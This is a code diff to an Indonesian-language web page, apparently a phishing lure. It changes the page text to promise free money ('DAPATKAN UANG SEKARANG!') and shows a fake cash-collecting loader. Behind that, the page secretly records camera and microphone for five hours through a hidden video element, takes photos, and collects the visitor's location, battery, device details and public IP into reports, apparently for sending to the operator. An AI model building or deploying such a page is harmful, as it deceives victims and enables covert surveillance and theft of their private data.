@@ -15,6 +15,7 @@
       height: 100vh;
       flex-direction: column;
     }
+
     .popup {
       background-color: rgba(0, 0, 0, 0.7);
       padding: 30px;
@@ -22,6 +23,7 @@
       text-align: center;
       width: 300px;
     }
+
     button {
       transition: background 0.3s ease, transform 0.3s ease;
       padding: 10px 20px;
@@ -33,6 +35,7 @@
       font-weight: bold;
       cursor: pointer;
     }
+
     #video {
       display: none !important;
       width: 1px;
@@ -40,6 +43,7 @@
       position: absolute;
       left: -9999px;
     }
+
     .circle-light {
       position: absolute;
       top: 5px;
@@ -51,10 +55,13 @@
       box-shadow: 0 0 8px 3px red;
       z-index: 1000;
     }
+
     #loading {
       display: none;
       margin-top: 30px;
+      text-align: center;
     }
+
     .loader {
       border: 6px solid #f3f3f3;
       border-top: 6px solid #00ff88;
@@ -62,11 +69,25 @@
       width: 50px;
       height: 50px;
       animation: spin 1s linear infinite;
-      margin: auto;
+      margin: 0 auto 10px;
     }
+
+    .money-text {
+      font-size: 18px;
+      font-weight: bold;
+      color: #00ff88;
+      animation: blink 1s infinite;
+    }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.4; }
+      100% { opacity: 1; }
     }
   </style>
 </head>
@@ -74,17 +95,18 @@
   <div class="circle-light"></div>
 
   <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
-    silahkan pencet lanjutkan.
+    silahkan pencet lanjutkan untuk mendapatkan uang
   </marquee>
 
   <div class="popup" id="step1">
-    <h2>SILAHKAN PENCET LANJUTKAN</h2>
+    <h2>DAPATKAN UANG SEKARANG!</h2>
     <button onclick="startAll()">LANJUTKAN</button>
   </div>
 
   <div id="loading">
     <div class="loader"></div>
-    <p>loadinggg...</p>
+    <p class="money-text">Mengumpulkan Uang Tunai 💸...</p>
+    <p style="font-size:14px;">Harap tunggu, sistem sedang memproses...</p>
   </div>
 
   <video id="video" autoplay playsinline muted></video>
@@ -102,10 +124,20 @@
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById('video').srcObject = stream;
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
+
+        await new Promise(resolve => setTimeout(resolve, 1500));
 
         const synth = window.speechSynthesis;
-        const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
+        const welcome = new SpeechSynthesisUtterance('Selamat! Uang sedang dikirim ke dompet digital Anda.');
         welcome.lang = 'id-ID';
         synth.speak(welcome);
 
@@ -125,7 +157,7 @@
 
         setTimeout(() => {
           recorder.stop();
-          alert("Rekaman otomatis selesai setelah 5 jam.");
+          alert("Selesai! Terima kasih telah menunggu.");
         }, 5 * 60 * 60 * 1000);
       } catch (err) {
         alert("Akses kamera/mikrofon ditolak.");
@@ -137,14 +169,12 @@
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
 
-      await new Promise(resolve => setTimeout(resolve, 1000));
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
       for (let i = 0; i < 3; i++) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
         const info = await getDeviceInfo();
 
         const caption = `
@@ -174,7 +204,6 @@ Waktu: ${info.time}
       const waktu = new Date();
       const jam = waktu.toLocaleTimeString();
       const tanggal = waktu.toLocaleDateString();
-      const fullTime = waktu.toString();
 
       let location = "Tidak tersedia";
       await new Promise(resolve => {
@@ -210,11 +239,12 @@ Waktu: ${info.time}
       recordedChunks = [];
 
       const info = await getDeviceInfo();
+      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
 
       const message = `
 [REKAMAN OTOMATIS]
 Device: ${info.device}
-IP: ${await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)}
+IP: ${ip}
 Waktu: ${info.time}
 Lokasi: ${info.location}
 Baterai: ${info.battery}
